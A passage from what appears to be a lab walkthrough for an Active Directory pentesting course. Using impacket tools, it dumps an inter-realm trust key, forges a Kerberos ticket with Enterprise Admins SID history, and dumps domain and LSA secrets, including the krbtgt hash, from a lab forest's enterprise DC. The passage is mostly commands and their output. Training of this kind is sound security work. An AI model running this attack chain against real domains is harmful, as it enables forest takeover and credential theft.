- Find the Inter-Realm Trust Key.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# impacket-secretsdump dollarcorp.moneycorp.local/svcadmin:'*ThisisBlasphemyThisisMadness!!'@172.16.2.1 -just-dc-user 'mcorp$'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mcorp$:1103:aad3b435b51404eeaad3b435b51404ee:15f995fad556f33d8db3535b9df77745:::
[*] Kerberos keys grabbed
mcorp$:aes256-cts-hmac-sha1-96:d97ac2d4eb1f1b7307936d2499c85a2b18bf5e08969c942f2f17487f276c1651
mcorp$:aes128-cts-hmac-sha1-96:510a256ef182a5466f8f6524830fc6e1
mcorp$:des-cbc-md5:d032d5e03b0489a2
[*] Cleaning up...
```

- Forge a ticket with SID History of Enterprise Admins.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-ticketer -nthash 15f995fad556f33d8db3535b9df77745 -domain dollarcorp.moneycorp.local -domain-sid S-1-5-21-719815819-3726368948-3917688648 -extra-sid S-1-5-21-335606122-960912869-3279953914-519 -spn krbtgt/moneycorp.local Administrator 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for dollarcorp.moneycorp.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

- Import the TGT.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# export KRB5CCNAME=Administrator.ccache
```

- Request a ST for `cifs/mcorp-dc.moneycorp.local` as `fakeadmin`.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-getST -k -no-pass -spn cifs/mcorp-dc.moneycorp.local moneycorp.local/Administrator@moneycorp.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting ST for user
[*] Saving ticket in Administrator@moneycorp.local.ccache
```

- Import the ST.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# export KRB5CCNAME=Administrator@moneycorp.local.ccache
```

- Dump secrets from the Enterprise DC.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# impacket-secretsdump -k -no-pass Administrator@mcorp-dc.moneycorp.local
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                                   

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8594fbe9bebff78909411940399448d0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:46624c8c5f16e394fd40f619d87ca7a6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
mcorp\MCORP-DC$:plain_password_hex:43e2a5240ab5e391fe405163adbceaa7da07f74639c344be12678912013175a9f6e7f919e54c218ed528cf522c3e3c1f3b1952aeb9763a39ce9a46c423ee9460b18ba8900259975fbc6ad03c78be7a00b0c55bc92c44534dfd8a2b66b7e9638efbf36f24
cfc0ef0192ccab8d935a418e317c24ce80e98a799d422c1e3432d3e6e2c0d17afaca8e82e53ece34da1b0d3e90ed1b6bb123882297d6885c99ec82f9d4c51a643bf4147052fc76fd4974e3b28eacab18d928942f0b3b49c199ff6059d49b0e472ca7a09286e3c26ec079be0e0594e8f7c8b601d3184
5b32a8dc203407efccdd72af3cc2b8e3e781fa9840f63
mcorp\MCORP-DC$:aad3b435b51404eeaad3b435b51404ee:22d5e5204cc1e966ef9bdb9a52507d86:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x9108bf553331c3e25674b4ba280c7ba60a827ab2
dpapi_userkey:0xa6a9886f93c546fcd9883b9e0c71f7c8a5832861
[*] NL$KM 
 0000   21 55 A8 F7 64 DD 9A FA  80 95 0F 03 E8 E4 76 5E   !U..d.........v^
 0010   11 34 99 56 DE 62 E1 00  C6 FD 7D B8 14 AF 4F 73   .4.V.b....}...Os
 0020   58 C1 68 E3 16 E2 04 98  93 A5 39 C6 1B 7A E4 19   X.h.......9..z..
 0030   FE E6 EF DC 73 64 72 8C  F9 2A F2 5C 68 D2 DB 73   ....sdr..*.\h..s
NL$KM:2155a8f764dd9afa80950f03e8e4765e11349956de62e100c6fd7db814af4f7358c168e316e2049893a539c61b7ae419fee6efdc7364728cf92af25c68d2db73
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:71d04f9d50ceb1f64de7a09f23e6dc4c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0981492d5dfab1ae0b97b51ea895ddf:::
MCORP-DC$:1000:aad3b435b51404eeaad3b435b51404ee:22d5e5204cc1e966ef9bdb9a52507d86:::
dcorp$:1103:aad3b435b51404eeaad3b435b51404ee:15f995fad556f33d8db3535b9df77745:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a85958da138b6b0cea2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0
Administrator:aes128-cts-hmac-sha1-96:294d631dda15cc844b48a18a51f0e85e
Administrator:des-cbc-md5:ba4a1abc01d3ec9d

<snip>